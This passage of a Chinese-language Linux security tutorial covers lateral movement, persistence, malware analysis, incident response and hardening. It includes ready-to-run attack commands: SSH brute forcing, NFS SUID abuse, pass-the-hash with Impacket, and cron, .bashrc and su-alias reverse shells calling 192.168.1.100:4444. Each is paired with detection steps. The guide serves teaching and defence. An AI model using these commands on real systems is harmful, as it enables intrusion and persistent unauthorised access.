find / -name "authorized_keys" 2>/dev/null

# 查找 SSH 配置
cat /root/.ssh/config
cat /home/*/.ssh/config

# 查找已知主机
cat /root/.ssh/known_hosts
cat /home/*/.ssh/known_hosts
```

**SSH 暴力破解**

```bash
# 使用 Hydra
hydra -l user -P passwords.txt ssh://target_ip

# 使用 Medusa
medusa -u user -P passwords.txt -h target_ip -M ssh

# 使用 Nmap 脚本
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt target_ip
```

### 4.2 NFS 横向移动

**NFS 概述**

NFS（Network File System）是 Linux/Unix 系统中常用的网络文件系统协议，使用端口 2049。如果 NFS 配置不当，可能被用于横向移动。

**NFS 信息收集**

```bash
# 扫描 NFS 服务
nmap -p 111,2049 -sV target_ip
rpcinfo -p target_ip

# 查看 NFS 共享
showmount -e target_ip

# 查看共享详细信息
nmap -p 2049 --script nfs-showmount target_ip
nmap -p 2049 --script nfs-ls target_ip
```

**NFS 挂载和利用**

```bash
# 挂载 NFS 共享
mount -t nfs target_ip:/share /mnt/nfs

# 如果共享配置了 no_root_squash，可以创建 SUID 文件
cp /bin/bash /mnt/nfs/bash
chmod u+s /mnt/nfs/bash

# 然后在目标系统上执行
/mnt/share/bash -p
```

### 4.3 SMB/Samba 横向移动

**Samba 信息收集**

```bash
# 扫描 SMB 服务
nmap -p 139,445 -sV target_ip

# 列出共享
smbclient -L //target_ip -U user
smbclient -L //target_ip -N  # 空密码

# 使用 enum4linux
enum4linux target_ip
enum4linux -a target_ip
```

**SMB 连接和文件操作**

```bash
# 连接 SMB 共享
smbclient //target_ip/share -U user%password

# 挂载 SMB 共享
mount -t cifs //target_ip/share /mnt/smb -o username=user,password=password

# 使用 smbmap
smbmap -H target_ip -u user -p password
smbmap -H target_ip -u user -p password -R
```

**PsExec 类工具（Linux）**

```bash
# Impacket psexec
psexec.py user:password@target_ip
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 user@target_ip

# Impacket smbexec
smbexec.py user:password@target_ip

# Impacket wmiexec
wmiexec.py user:password@target_ip

# CrackMapExec
crackmapexec smb target_ip -u user -p password -x 'whoami'
```

### 4.4 RSH/Rlogin 横向移动

**RSH 概述**

RSH（Remote Shell）和 Rlogin 是较老的远程访问协议，使用端口 513 和 514。这些协议不安全（明文传输、基于主机信任），但在一些老旧系统中仍可能存在。

**检测和利用**

```bash
# 扫描 RSH/Rlogin 服务
nmap -p 513,514 -sV target_ip

# 使用 rlogin 连接
rlogin target_ip -l user

# 使用 rsh 执行命令
rsh target_ip -l user 'whoami'
```

---

## 五、Linux 权限维持

### 5.1 SSH 密钥后门

**原理**

SSH 公钥认证是一种常见的认证方式。攻击者可以将自己的公钥添加到目标主机的 authorized_keys 文件中，从而实现持久化访问。

**SSH 密钥持久化方法**

```bash
# 1. 直接追加公钥到 authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... attacker@host" >> ~/.ssh/authorized_keys

# 2. 确保目录权限正确
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# 3. 更隐蔽的方式 - 使用 authorized_keys 选项
# 限制来源 IP、执行特定命令等
echo 'command="echo hacked",no-pty,no-port-forwarding ssh-rsa AAAAB3... attacker@host' >> ~/.ssh/authorized_keys
```

**SSH 密钥后门检测**

```bash
# 查看所有 authorized_keys 文件
find / -name "authorized_keys" -type f 2>/dev/null

# 查看所有私钥文件
find / -name "id_*" -type f ! -name "*.pub" 2>/dev/null

# 检查 authorized_keys 内容
cat ~/.ssh/authorized_keys
cat /root/.ssh/authorized_keys

# 检查 SSH 配置
cat /etc/ssh/sshd_config | grep -i authorizedkeysfile
```

### 5.2 Crontab 后门

**原理**

Cron 计划任务可以定期执行命令，是最常见的持久化方式之一。

**常见 Cron 后门位置**

```bash
# 1. 用户 crontab
crontab -e
crontab -l

# 2. 系统 crontab
cat /etc/crontab

# 3. cron.d 目录
ls -la /etc/cron.d/

# 4. 周期任务目录
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# 5. 用户 crontab 文件
ls -la /var/spool/cron/crontabs/  # Debian/Ubuntu
ls -la /var/spool/cron/           # CentOS/RHEL
```

**Cron 后门示例**

```bash
# 反弹 shell（每分钟执行）
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'" | crontab -

# 更隐蔽的方式 - 添加到系统 cron.d
cat > /etc/cron.d/system-update << 'EOF'
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=""
*/5 * * * * root /usr/bin/system-update.sh
EOF

# 脚本中隐藏后门
echo "*/30 * * * * root /usr/bin/apt-get update" > /etc/cron.d/apt-update
# 实际脚本中包含后门
```

**Cron 后门检测**

```bash
# 列出所有 crontab
for user in $(cut -f1 -d: /etc/passwd); do echo "=== $user ==="; crontab -u $user -l 2>/dev/null; done

# 检查所有 cron 相关文件
find /etc/cron* -type f -exec ls -la {} \;
find /var/spool/cron* -type f -exec ls -la {} \;

# 查看 cron 日志
grep CRON /var/log/syslog
grep CRON /var/log/cron
```

### 5.3 系统服务后门

**Systemd 服务后门**

```bash
# 创建恶意 systemd 服务
cat > /etc/systemd/system/system-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/system-update.sh
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

# 启用并启动服务
systemctl daemon-reload
systemctl enable system-update.service
systemctl start system-update.service
```

**init.d 服务后门**

```bash
# 创建 init.d 脚本
cat > /etc/init.d/system-update << 'EOF'
#!/bin/bash
# chkconfig: 2345 99 01
# description: System Update Service

case "$1" in
    start)
        /usr/bin/system-update.sh &
        ;;
    stop)
        killall system-update.sh
        ;;
    *)
        echo "Usage: $0 {start|stop}"
        exit 1
        ;;
esac
exit 0
EOF

chmod +x /etc/init.d/system-update

# CentOS/RHEL
chkconfig --add system-update
chkconfig system-update on

# Debian/Ubuntu
update-rc.d system-update defaults
```

**服务后门检测**

```bash
# 列出所有 systemd 服务
systemctl list-unit-files --type=service
systemctl list-units --type=service --all

# 列出所有 init.d 服务
ls -la /etc/init.d/
chkconfig --list  # CentOS/RHEL
service --status-all  # Debian/Ubuntu

# 检查非标准服务
systemctl list-unit-files --type=service | grep -v '@' | grep -v '.mount' | grep -v 'sysinit'

# 检查服务文件内容
cat /etc/systemd/system/malicious.service
```

### 5.4 Shell 配置文件后门

**原理**

Shell 配置文件在用户登录或打开终端时执行，可以用于持久化后门。

**常见 Shell 配置文件**

```bash
# 全局配置
/etc/profile
/etc/bashrc
/etc/profile.d/
/etc/zsh/zshrc

# 用户级配置
~/.bashrc
~/.bash_profile
~/.bash_login
~/.profile
~/.zshrc
~/.cshrc
~/.tcshrc
```

**Shell 配置文件后门示例**

```bash
# 在 .bashrc 中添加反弹 shell
echo "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &" >> ~/.bashrc

# 更隐蔽的方式 - 别名劫持
echo "alias su='bash -c \"bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &\"; su'" >> ~/.bashrc

# 使用 PROMPT_COMMAND（每次命令执行后运行）
echo "PROMPT_COMMAND='(/usr/local/bin/backdoor &)'" >> ~/.bashrc

# 利用 /etc/profile.d/
cat > /etc/profile.d/update.sh << 'EOF'
#!/bin/bash
# System update script
/usr/local/bin/update_check &
EOF
chmod +x /etc/profile.d/update.sh
```

**Shell 配置后门检测**

```bash
# 检查所有用户的 shell 配置文件
for user in $(cut -f1 -d: /etc/passwd); do
    home=$(getent passwd $user | cut -d: -f6)
    echo "=== $user ==="
    [ -f "$home/.bashrc" ] && cat "$home/.bashrc" | grep -i "bash -i\|nc\|reverse\|ncat\|socat"
    [ -f "$home/.bash_profile" ] && cat "$home/.bash_profile" | grep -i "bash -i\|nc\|reverse"
    [ -f "$home/.profile" ] && cat "$home/.profile" | grep -i "bash -i\|nc\|reverse"
done

# 检查全局配置
grep -r "bash -i\|reverse_shell\|nc.*-e\|socat" /etc/profile* /etc/bash* /etc/zsh/ 2>/dev/null

# 检查 profile.d 目录
ls -la /etc/profile.d/
```

### 5.5 Rootkit

**Rootkit 概述**

Rootkit 是一种高级恶意软件，旨在隐藏自身和其他恶意程序的存在，同时保持对系统的特权访问。Rootkit 通常工作在内核层，难以检测和清除。

**Rootkit 类型**

| 类型 | 描述 | 检测难度 |
|------|------|----------|
| 用户态 Rootkit | 修改用户态工具（ps、ls、netstat 等） | 低 |
| 内核态 Rootkit | 加载内核模块，修改内核函数 | 高 |
| 固件 Rootkit | 植入硬件固件（BIOS、硬盘固件等） | 极高 |
| 内存 Rootkit | 仅存在于内存中，不写入磁盘 | 中 |

**常见 Rootkit 技术**

1. **系统调用劫持**：修改系统调用表（sys_call_table），替换关键系统调用
2. **LKM Rootkit**：通过可加载内核模块（LKM）修改内核
3. **符号劫持**：修改动态链接器，替换库函数
4. **进程隐藏**：修改进程列表，隐藏恶意进程
5. **文件隐藏**：修改文件系统调用，隐藏恶意文件
6. **端口隐藏**：修改网络系统调用，隐藏网络连接

**Rootkit 检测工具**

```bash
# chkrootkit
chkrootkit
chkrootkit -q  # 静默模式，只输出可疑项

# rkhunter (Rootkit Hunter)
rkhunter --check
rkhunter --update  # 更新特征库
rkhunter --propupd  # 更新文件属性数据库

# 检查内核模块
lsmod
modinfo module_name

# 检查可疑的内核模块
cat /proc/modules
ls -la /lib/modules/$(uname -r)/

# 检查 /proc 和 /sys
# 对比 ps 和 /proc 中的进程数
ps -ef | wc -l
ls /proc | grep -E '^[0-9]+$' | wc -l

# 检查系统二进制文件完整性
rpm -Va  # CentOS/RHEL
dpkg -V  # Debian/Ubuntu
debsums -c  # Debian/Ubuntu
```

**著名 Linux Rootkit**

- Suckit：经典的 Linux Rootkit
- Adore：LKM Rootkit
- Knark：2.2/2.4 内核的 Rootkit
- Suterusu：现代 Linux Rootkit
- Diamorphine：开源的 LKM Rootkit
- Reptile：开源 Rootkit 框架

---

## 六、Linux 恶意代码分析

### 6.1 ELF 文件结构

**ELF 文件概述**

ELF（Executable and Linkable Format）是 Linux/Unix 平台的可执行文件格式，包括可执行文件、共享库（.so）、目标文件（.o）和核心转储文件。

**ELF 文件结构**

```
┌─────────────────────┐
│  ELF Header         │  ← ELF 文件头，包含魔数、架构、入口点等
├─────────────────────┤
│  Program Headers    │  ← 程序头表，描述运行时的段（Segment）
├─────────────────────┤
│  .text 段           │  ← 代码段，存储可执行指令
├─────────────────────┤
│  .rodata 段         │  ← 只读数据段
├─────────────────────┤
│  .data 段           │  ← 数据段，存储初始化的全局变量
├─────────────────────┤
│  .bss 段            │  ← 未初始化数据段（不占文件空间）
├─────────────────────┤
│  .got 段            │  ← 全局偏移表
├─────────────────────┤
│  .plt 段            │  ← 过程链接表
├─────────────────────┤
│  .dynsym 段         │  ← 动态符号表
├─────────────────────┤
│  .dynstr 段         │  ← 动态字符串表
├─────────────────────┤
│  Section Headers    │  ← 节头表，描述各个节（Section）
└─────────────────────┘
```

**ELF 分析工具**

```bash
# 查看 ELF 文件头
readelf -h binary

# 查看程序头
readelf -l binary

# 查看节头
readelf -S binary

# 查看符号表
readelf -s binary
nm binary

# 查看动态符号表
readelf -d binary
nm -D binary

# 查看字符串
strings binary

# 反汇编
objdump -d binary
objdump -M intel -d binary  # Intel 语法

# 查看依赖的共享库
ldd binary
```

### 6.2 Linux 恶意代码常见类型

**病毒（Virus）**

- 感染其他文件，将自身代码附加或注入到宿主程序中
- 需要用户操作才能传播（运行受感染的程序）
- Linux 病毒相对较少，但仍存在（如 Linux.Rarog、Linux.Zariche）

**木马（Trojan）**

- 伪装成正常程序，实际执行恶意操作
- 常见类型：后门木马、远控木马、窃取木马
- 经常伪装成系统工具或常用软件

**蠕虫（Worm）**

- 能够自我复制并通过网络传播
- 利用漏洞或弱口令进行传播
- 著名案例：SQL Slammer、Code Red（虽主要影响 Windows，但 Linux 也有蠕虫）

**勒索软件（Ransomware）**

- 加密用户文件并勒索赎金
- Linux 勒索软件主要针对服务器
- 著名家族：LockBit、Conti、BlackCat、Babuk

**挖矿木马（Miner）**

- 利用受害者计算资源挖掘加密货币
- 是 Linux 服务器上最常见的恶意软件类型之一
- 常见家族：XMRig（被恶意利用）、SystemdMiner、Kwork

**Rootkit**

- 隐藏自身和其他恶意软件的存在
- 提供持久化的特权访问
- 用户态和内核态两种类型

**僵尸网络（Botnet）**

- 大量被攻陷的主机组成的网络
- 用于 DDoS 攻击、垃圾邮件、挖矿等
- Linux 是物联网僵尸网络的主要目标
- 著名家族：Mirai、Qbot、Gafgyt

### 6.3 Linux 恶意代码分析方法

**静态分析**

```bash
# 1. 文件类型识别
file binary
readelf -h binary

# 2. 字符串分析
strings binary | head -100
strings binary | grep -i "pass\|secret\|key\|http\|/bin/sh\|/etc/shadow"

# 3. 导入函数分析
readelf -d binary | grep NEEDED
nm -D binary | grep " U "

# 4. 符号分析
readelf -s binary
nm binary

# 5. 节区分析
readelf -S binary

# 6. 反汇编
objdump -d binary | head -200
# 使用更强大的反汇编工具
# IDA Pro、Ghidra、Radare2
```

**动态分析**

```bash
# 1. 系统调用跟踪
strace ./binary
strace -f ./binary  # 跟踪子进程
strace -e trace=open,read,write,connect,socket ./binary  # 只跟踪特定系统调用

# 2. 库调用跟踪
ltrace ./binary

# 3. 网络行为监控
# 使用 tcpdump/wireshark 抓包
tcpdump -i eth0 -w capture.pcap host target_ip

# 使用 netstat 查看连接
netstat -anp | grep binary

# 4. 文件系统监控
# 使用 inotifywait 监控文件变化
inotifywait -m -r /tmp /etc /var -e create -e modify -e delete

# 5. 进程监控
ps aux | grep binary
top -p $(pidof binary)
```

**沙箱环境**

```bash
# 使用 firejail 隔离运行
firejail --noprofile --net=none ./binary

# 使用 systemd-run 沙箱
systemd-run --user --scope -p DynamicUser=yes -p PrivateTmp=yes -p PrivateNetwork=yes ./binary

# 使用 Docker 隔离
docker run --rm -it -v $(pwd)/binary:/tmp/binary --network none ubuntu /tmp/binary
```

### 6.4 Linux 恶意代码检测

**进程检测**

```bash
# 查看所有进程
ps auxf
ps -ef

# 查看进程树
pstree -p

# 查看进程打开的文件
lsof -p <pid>

# 查看进程网络连接
lsof -i -P -n | grep LISTEN
netstat -tulnp
ss -tulnp

# 查看进程内存映射
cat /proc/<pid>/maps
pmap <pid>

# 对比 ps 和 /proc 发现隐藏进程
ps -eo pid | sort -n > /tmp/ps_pids.txt
ls /proc | grep -E '^[0-9]+$' | sort -n > /tmp/proc_pids.txt
diff /tmp/ps_pids.txt /tmp/proc_pids.txt
```

**文件检测**

```bash
# 查找最近修改的文件
find / -mtime -1 -type f 2>/dev/null  # 最近1天修改的文件
find / -ctime -1 -type f 2>/dev/null  # 最近1天状态变更的文件

# 查找 SUID/SGID 文件
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# 查找无属主的文件
find / -nouser -o -nogroup 2>/dev/null

# 查找隐藏文件
find / -name ".*" -type f 2>/dev/null

# 校验系统文件完整性
rpm -Va  # CentOS/RHEL
dpkg -V  # Debian/Ubuntu
debsums -s  # Debian/Ubuntu
```

**网络检测**

```bash
# 查看所有网络连接
netstat -tulnp
ss -tulnp
ss -tuanp

# 查看监听端口
lsof -i -P -n | grep LISTEN

# 查看网络流量
iftop
nethogs

# 检查可疑域名和 IP
# 查看 DNS 查询记录
tcpdump -i eth0 udp port 53

# 查看 hosts 文件
cat /etc/hosts
```

**Rootkit 检测**

```bash
# 使用 rkhunter
rkhunter --check --report-warnings-only

# 使用 chkrootkit
chkrootkit -q

# 检查内核模块
lsmod
modinfo <module_name>

# 检查系统调用表
# 对比已知正常的 sys_call_table

# 检查 /proc 文件系统异常
ls -la /proc/ | grep -v "^d"
```

---

## 七、Linux 应急响应

### 7.1 应急响应准备

**工具准备**

| 类别 | 工具 | 用途 |
|------|------|------|
| 进程分析 | ps、top、htop、lsof、pstree | 进程查看和分析 |
| 网络分析 | netstat、ss、tcpdump、wireshark | 网络连接和流量分析 |
| 文件分析 | file、strings、md5sum、sha256sum | 文件分析和哈希计算 |
| 日志分析 | grep、awk、sed、journalctl | 日志分析 |
| 内存取证 | LiME、Volatility | 内存镜像和分析 |
| 磁盘取证 | dd、FTK Imager、Autopsy | 磁盘镜像和分析 |
| Rootkit 检测 | rkhunter、chkrootkit | Rootkit 检测 |
| 完整性检查 | rpm、dpkg、AIDE | 文件完整性检查 |

### 7.2 事件确认

**常见入侵迹象**

1. **系统异常**：系统变慢、CPU/内存使用率异常、未知进程
2. **网络异常**：异常出站连接、大量流量、未知端口监听
3. **文件异常**：未知文件、文件被篡改、勒索信息
4. **账户异常**：未知账户、异常登录、密码被改
5. **服务异常**：未知服务、服务异常重启
6. **安全告警**：IDS/IPS、HIDS、WAF 告警

**初步信息收集**

```bash
# 系统基本信息
uname -a
cat /etc/os-release
hostname
date

# 当前登录用户
who
w
last
lastb

# 网络连接
netstat -tulnp
ss -tuanp

# 进程列表
ps auxf
ps -ef

# 服务列表
systemctl list-units --type=service --state=running
service --status-all

# 计划任务
crontab -l
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/
ls -la /etc/cron.daily/

# 用户列表
cat /etc/passwd
cat /etc/shadow
```

### 7.3 证据保全

**易失性数据收集**

按照从易失到不易失的顺序收集证据：

```bash
# 1. 网络连接和状态
netstat -tulnp > /evidence/netstat.txt
ss -tuanp > /evidence/ss.txt
arp -a > /evidence/arp.txt
route -n > /evidence/route.txt
iptables -L -n -v > /evidence/iptables.txt

# 2. 进程信息
ps auxf > /evidence/ps.txt
pstree -p > /evidence/pstree.txt
lsof > /evidence/lsof.txt

# 3. 内存镜像
# 使用 LiME (Linux Memory Extractor)
insmod lime.ko "path=/evidence/memory.raw format=raw"
# 或使用 AVML (Azure VM Memory Acquisition)
./avml /evidence/memory.raw

# 4. 文件系统
# 记录文件元数据
find / -type f -exec ls -la {} \; > /evidence/files.txt  # 不推荐，太慢
# 更好的方法：重点目录
ls -laR /etc > /evidence/etc_ls.txt
ls -laR /tmp > /evidence/tmp_ls.txt
ls -laR /var > /evidence/var_ls.txt  # 根据需要选择

# 5. 日志
cp -r /var/log /evidence/logs/
journalctl --no-pager > /evidence/journalctl.log
```

**磁盘镜像**

```bash
# 使用 dd 创建磁盘镜像
dd if=/dev/sda of=/evidence/disk.dd bs=4096 conv=noerror,sync status=progress

# 使用 dc3dd（增强版 dd，带哈希计算）
dc3dd if=/dev/sda of=/evidence/disk.dd hash=sha256 log=/evidence/dc3dd.log

# 使用 FTK Imager（GUI 工具）
```

### 7.4 入侵分析

**账户分析**

```bash
# 查看所有用户
cat /etc/passwd
cat /etc/shadow

# 查看 UID 为 0 的用户（root 权限）
awk -F: '($3 == 0) {print $1}' /etc/passwd

# 查看最近登录
last
lastb  # 失败的登录
lastlog

# 查看 sudo 日志
grep sudo /var/log/auth.log
grep sudo /var/log/secure

# 检查可疑账户
# 1. 没有家目录的用户
awk -F: '{ if ($6 == "") print $0 }' /etc/passwd

# 2. 可登录的系统账户（UID < 1000 但 shell 可登录）
awk -F: '($3 < 1000 && $7 !~ /nologin|false|sync|shutdown|halt/) {print $1, $3, $7}' /etc/passwd
```

**进程分析**

```bash
# 1. 查看所有进程
ps auxf
ps -efH

# 2. 查看 CPU/内存占用最高的进程
top -b -n 1 | head -20
ps aux --sort=-%cpu | head -10
ps aux --sort=-%mem | head -10

# 3. 查看进程打开的文件
lsof -p <pid>
lsof | grep -i deleted  # 已删除但仍在运行的文件（可疑）

# 4. 查看进程的可执行文件路径
ls -la /proc/<pid>/exe
readlink /proc/<pid>/exe

# 5. 查看进程的命令行
cat /proc/<pid>/cmdline | tr '\0' ' '
echo

# 6. 查看进程的环境变量
cat /proc/<pid>/environ | tr '\0' '\n'

# 7. 检查隐藏进程
# 对比 ps 输出和 /proc 目录
```

**网络分析**

```bash
# 1. 查看所有网络连接
netstat -tulnp
ss -tuanp
lsof -i -P -n

# 2. 查看监听端口
netstat -tulnp | grep LISTEN
ss -tlnp

# 3. 查看已建立的连接
netstat -tanp | grep ESTABLISHED
ss -tanp | grep ESTAB

# 4. 抓包分析
tcpdump -i eth0 -w /evidence/capture.pcap -s 0
tcpdump -i eth0 -n -c 100  # 实时查看 100 个包

# 5. 检查可疑连接
# 连接到已知恶意 IP 的连接
# 连接到非标准端口的连接
# 大量出站连接（可能是 C2 或扫描）
```

**文件分析**

```bash
# 1. 查找最近修改的文件
find / -mtime -1 -type f 2>/dev/null  # 最近 1 天
find / -mmin -60 -type f 2>/dev/null  # 最近 60 分钟

# 2. 查找隐藏文件
find / -name ".*" -type f 2>/dev/null
find /tmp -name ".*" -type f 2>/dev/null

# 3. 查找 SUID/SGID 文件
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# 4. 查找无属主文件
find / -nouser -o -nogroup 2>/dev/null

# 5. 计算文件哈希
md5sum /path/to/file
sha256sum /path/to/file

# 6. 查看文件字符串
strings /path/to/file | head -50

# 7. 检查系统文件完整性
rpm -Va  # CentOS/RHEL
dpkg -V  # Debian/Ubuntu
```

**日志分析**

```bash
# 认证日志
tail -100 /var/log/auth.log  # Debian/Ubuntu
tail -100 /var/log/secure    # CentOS/RHEL

# 系统日志
tail -100 /var/log/syslog    # Debian/Ubuntu
tail -100 /var/log/messages  # CentOS/RHEL

# 系统 journal
journalctl -u sshd --since "2024-09-01" --until "2024-09-11"
journalctl -p err..alert --since yesterday

# 登录失败日志
grep "Failed password" /var/log/auth.log
grep "authentication failure" /var/log/auth.log
lastb

# sudo 日志
grep "sudo" /var/log/auth.log
grep "COMMAND=" /var/log/auth.log

# 防火墙日志
grep -i "iptables\|firewall\|ufw" /var/log/syslog
grep -i "iptables\|firewalld" /var/log/messages

# 审计日志
ausearch -m avc -ts today
ausearch -k time_change -ts today
```

### 7.5 遏制与根除

**遏制措施**

1. **网络隔离**：断开受感染主机的网络连接
   ```bash
   # 禁用网络接口
   ifdown eth0
   ip link set eth0 down
   # 或使用防火墙阻断所有入站/出站
   iptables -P INPUT DROP
   iptables -P OUTPUT DROP
   iptables -F
   ```

2. **账户禁用**：禁用被攻陷的账户
   ```bash
   passwd -l username  # 锁定账户
   usermod -s /sbin/nologin username  # 修改 shell
   ```

3. **终止恶意进程**
   ```bash
   kill <pid>
   kill -9 <pid>  # 强制终止
   pkill process_name
   killall process_name
   ```

4. **停止恶意服务**
   ```bash
   systemctl stop malicious.service
   service malicious stop
   ```

**根除措施**

1. **删除恶意文件**
2. **清理持久化机制**（cron、服务、SSH 密钥等）
3. **恢复被篡改的系统文件**
4. **重置所有凭据**（密码、密钥、token 等）
5. **修复被利用的漏洞**

### 7.6 恢复与总结

**恢复步骤**

1. 从干净备份恢复系统（优先选择）
2. 或在确认清除恶意代码后重新接入网络
3. 加强监控，观察是否有复发迹象
4. 修复被利用的漏洞和弱点

**事件报告**

```
应急响应报告应包含：
1. 事件概述：时间、影响范围、严重程度
2. 入侵路径：攻击者是如何进入的
3. 攻击链：攻击者做了什么（时间线）
4. 影响评估：数据泄露、系统破坏、业务影响
5. 处置措施：采取了哪些遏制和根除措施
6. IOC 指标：IP、域名、文件哈希、进程名等
7. 改进建议：如何防止类似事件再次发生
```

---

## 八、Linux 安全加固脚本说明

> 详细的加固脚本请参考 `linux_hardening.sh` 文件。以下是脚本的主要功能说明。

### 脚本功能概述

**1. 系统更新**
- 更新系统软件包
- 配置自动安全更新

**2. 账户安全**
- 配置密码策略（长度、复杂度、有效期）
- 配置账户锁定策略
- 禁用不必要的系统账户
- 禁用 root SSH 登录

**3. SSH 安全**
- 禁用 root 远程登录
- 禁用密码认证（建议启用密钥后）
- 修改默认 SSH 端口（可选）
- 配置空闲超时
- 限制最大认证尝试次数

**4. 防火墙配置**
- 配置 iptables/ufw 防火墙
- 默认入站拒绝
- 允许必要的服务端口
- 防止常见攻击（SYN Flood 等）

**5. 文件权限加固**
- 设置关键配置文件权限
- 查找并修复危险的 SUID/SGID 文件
- 设置 umask

**6. 审计配置**
- 安装和配置 auditd
- 配置关键文件和操作的审计规则
- 配置日志轮转

**7. 内核参数加固**
- 网络安全参数（防止 IP 欺骗、SYN Flood）
- 内存安全参数
- 禁用不必要的内核模块
- 启用 ASLR

**8. 服务加固**
- 禁用不必要的服务
- 配置服务最小权限

**9. 安全工具安装**
- 安装 fail2ban（防止暴力破解）
- 安装 rkhunter/chkrootkit（Rootkit 检测）
- 安装 AIDE（文件完整性检查）

---

> 💡 **Linux 安全是一个持续的过程。定期审计、持续监控、及时更新补丁，才能有效保障系统安全。**
